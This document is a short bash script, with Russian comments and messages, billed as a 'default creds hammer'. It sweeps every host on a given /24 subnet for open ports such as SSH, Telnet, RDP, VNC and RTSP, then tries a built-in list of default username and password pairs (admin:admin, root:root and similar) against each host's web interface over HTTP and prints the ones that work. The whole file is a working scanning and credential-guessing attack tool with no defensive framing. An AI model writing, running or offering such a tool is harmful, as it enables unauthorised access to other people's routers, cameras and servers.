#!/bin/bash
TARGET=$1
[ -z "$TARGET" ] && { echo "Usage: $0 192.168.1.0/24"; exit 1; }
NETWORK=$(echo "$TARGET" | cut -d'/' -f1 | cut -d'.' -f1-3)
echo "╔══════════════════════════════════════════════╗"
echo "║   🔨 DEFAULT CREDS HAMMER                   ║"
echo "╚══════════════════════════════════════════════╝"

# Сканируем всё подряд
for ip in $(seq 1 254); do
    for port in 80 443 8080 8443 22 23 21 3389 5900 554; do
        timeout 0.3 bash -c "echo >/dev/tcp/$NETWORK.$ip/$port" 2>/dev/null && echo "$NETWORK.$ip:$port OPEN" &
    done
done
wait

# Список стандартных паролей для устройств
CREDS=(
    "admin:admin" "root:root" "admin:12345" "admin:password" "root:admin"
    "admin:admin123" "support:support" "user:user" "admin:1234" "root:pass"
    "admin:pass" "admin:manager" "root:root123" "admin:changeme"
)

echo "[HAMMER] 🔨 Пробую стандартные пароли..."
for cred in "${CREDS[@]}"; do
    user="${cred%%:*}"
    pass="${cred##*:}"
    for ip in $(seq 1 254); do
        curl -sk --max-time 2 -u "$user:$pass" "http://$NETWORK.$ip" -o /dev/null -w "%{http_code}" 2>/dev/null | grep -q "200" && echo "  💀 $NETWORK.$ip — $user:$pass РАБОТАЕТ!"
    done
done
